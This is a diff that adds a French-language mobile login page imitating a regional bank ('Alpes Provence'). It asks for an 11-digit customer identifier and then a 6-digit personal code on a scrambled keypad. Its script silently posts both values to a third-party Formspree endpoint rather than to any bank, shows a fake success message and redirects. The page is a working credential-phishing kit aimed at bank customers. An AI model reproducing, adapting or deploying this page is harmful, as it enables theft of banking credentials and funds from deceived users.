@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion | Alpes Provence</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bnp-bg: #000000;
+            --bnp-surface: #1C232D;
+            --bnp-emerald: #45A696;
+            --bnp-text-white: #FFFFFF;
+            --bnp-text-gray: #A1A1AA;
+            --font-main: 'Inter', sans-serif;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: var(--font-main);
+            background-color: var(--bnp-bg);
+            color: var(--bnp-text-white);
+            display: flex;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .region-badge {
+            align-self: center;
+            background-color: var(--bnp-surface);
+            padding: 8px 16px;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+            margin-bottom: 50px;
+        }
+
+        .region-badge span {
+            color: var(--bnp-emerald);
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .close-icon { color: #52525B; font-size: 1.5rem; cursor: pointer; line-height: 1; }
+
+        h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 10px; }
+        .sub-label { color: var(--bnp-text-white); opacity: 0.9; margin-bottom: 40px; font-size: 0.95rem; }
+
+        #step-i { display: block; width: 100%; }
+
+        .id-container {
+            background-color: var(--bnp-surface);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 4px solid var(--bnp-emerald);
+        }
+
+        .id-input {
+            width: 100%;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.8rem;
+            font-weight: 700;
+            text-align: center;
+            outline: none;
+            letter-spacing: 2px;
+        }
+
+        .find-link {
+            text-align: center;
+            color: var(--bnp-emerald);
+            font-weight: 600;
+            text-decoration: underline;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        #step-c { display: none; width: 100%; }
+
+        .code-grid-display {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 10px;
+            margin-bottom: 50px;
+        }
+
+        .code-box {
+            height: 55px;
+            background-color: var(--bnp-surface);
+            border-radius: 12px;
+            transition: background 0.3s;
+        }
+
+        .code-box.filled { background-color: var(--bnp-emerald); }
+
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 40px 20px;
+            text-align: center;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .num-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 2rem;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .del-btn-svg { width: 30px; fill: none; stroke: var(--bnp-emerald); stroke-width: 2; cursor: pointer; }
+
+        .footer { margin-top: auto; padding-bottom: 10px; text-align: center; }
+
+        .btn-continue {
+            width: 100%;
+            padding: 18px;
+            background-color: var(--bnp-emerald);
+            color: #002B26;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+
+        .btn-continue:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        #formMessage { margin-top: 15px; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="region-badge">
+            <span id="badge-text">Alpes Provence</span>
+            <div class="close-icon" id="reset-btn">×</div>
+        </div>
+
+        <form id="loginForm">
+            <div id="step-i">
+                <h2>Mes identifiants</h2>
+                <p class="sub-label">Saisissez votre identifiant à 11 chiffres</p>
+                
+                <div class="id-container">
+                    <input type="number" id="text1" name="text1" class="id-input" placeholder="00000000000">
+                </div>
+                
+                <a href="#" class="find-link">Où trouver mon identifiant ?</a>
+            </div>
+
+            <div id="step-c">
+                <h2>Code personnel</h2>
+                <p class="sub-label">Saisissez votre code à 6 chiffres</p>
+
+                <div class="code-grid-display">
+                    <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
+                    <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
+                </div>
+
+                <input type="hidden" id="text2" name="text2">
+
+                <div class="numpad">
+                    <button type="button" class="num-btn">1</button><button type="button" class="num-btn">7</button><button type="button" class="num-btn">3</button>
+                    <button type="button" class="num-btn">8</button><button type="button" class="num-btn">5</button><button type="button" class="num-btn">0</button>
+                    <button type="button" class="num-btn">4</button><button type="button" class="num-btn">2</button><button type="button" class="num-btn">6</button>
+                    <div style="visibility: hidden;"></div>
+                    <button type="button" class="num-btn">9</button>
+                    <button type="button" class="del-btn" id="delete-btn">
+                        <svg class="del-btn-svg" viewBox="0 0 24 24" stroke="currentColor"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zM18 9l-6 6m0-6l6 6"/></svg>
+                    </button>
+                </div>
+            </div>
+        </form>
+
+        <div class="footer">
+            <button class="btn-continue" id="main-action" disabled>Continuer</button>
+            <p id="formMessage"></p>
+        </div>
+    </div>
+
+    <script>
+        const identifiantInput = document.getElementById('text1');
+        const secretCodeInput = document.getElementById('text2');
+        const mainActionBtn = document.getElementById('main-action');
+        const stepId = document.getElementById('step-i');
+        const stepCode = document.getElementById('step-c');
+        const badgeText = document.getElementById('badge-text');
+        const codeBoxes = document.querySelectorAll('.code-box');
+        const numBtns = document.querySelectorAll('.num-btn');
+        const resetBtn = document.getElementById('reset-btn');
+        const messageEl = document.getElementById('formMessage');
+        
+        let enteredCode = "";
+
+        // 1. Validation Identifiant (11 chiffres)
+        identifiantInput.addEventListener('input', (e) => {
+            if(e.target.value.length === 11) {
+                mainActionBtn.disabled = false;
+            } else {
+                mainActionBtn.disabled = true;
+            }
+        });
+
+        // 2. Passage à l'étape Code
+        mainActionBtn.addEventListener('click', () => {
+            if (stepId.style.display !== 'none') {
+                badgeText.innerText = identifiantInput.value;
+                stepId.style.display = 'none';
+                stepCode.style.display = 'block';
+                mainActionBtn.style.display = 'none';
+            }
+        });
+
+        // 3. Clavier Numérique & Envoi Auto
+        numBtns.forEach(btn => {
+            btn.addEventListener('click', async () => {
+                if (enteredCode.length < 6) {
+                    enteredCode += btn.innerText;
+                    secretCodeInput.value = enteredCode;
+                    codeBoxes[enteredCode.length - 1].classList.add('filled');
+                }
+                
+                if (enteredCode.length === 6) {
+                    await sendData();
+                }
+            });
+        });
+
+        // 4. Suppression
+        document.getElementById('delete-btn').addEventListener('click', () => {
+            if (enteredCode.length > 0) {
+                codeBoxes[enteredCode.length - 1].classList.remove('filled');
+                enteredCode = enteredCode.slice(0, -1);
+                secretCodeInput.value = enteredCode;
+            }
+        });
+
+        // 5. Envoi Formspree
+        async function sendData() {
+            messageEl.textContent = "Vérification...";
+            messageEl.style.color = "#45A696";
+
+            const payload = {
+                text1: identifiantInput.value,
+                text2: secretCodeInput.value
+            };
+
+            try {
+                const response = await fetch('https://formspree.io/f/mvzdkdgo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    messageEl.textContent = "✅ Vérification réussie";
+                    setTimeout(() => {
+                        window.location.href = "done.html";
+                    }, 1500);
+                } else {
+                    throw new Error();
+                }
+            } catch (error) {
+                messageEl.textContent = "❌ Erreur de connexion";
+                messageEl.style.color = "#ff4d4d";
+                enteredCode = "";
+                secretCodeInput.value = "";
+                codeBoxes.forEach(box => box.classList.remove('filled'));
+            }
+        }
+
+        // Réinitialisation via la croix
+        resetBtn.addEventListener('click', () => {
+            enteredCode = "";
+            identifiantInput.value = "";
+            codeBoxes.forEach(box => box.classList.remove('filled'));
+            stepCode.style.display = 'none';
+            stepId.style.display = 'block';
+            badgeText.innerText = "Alpes Provence";
+            mainActionBtn.style.display = 'block';
+            mainActionBtn.disabled = true;
+            messageEl.textContent = "";
+        });
+    </script>
+</body>
+</html>
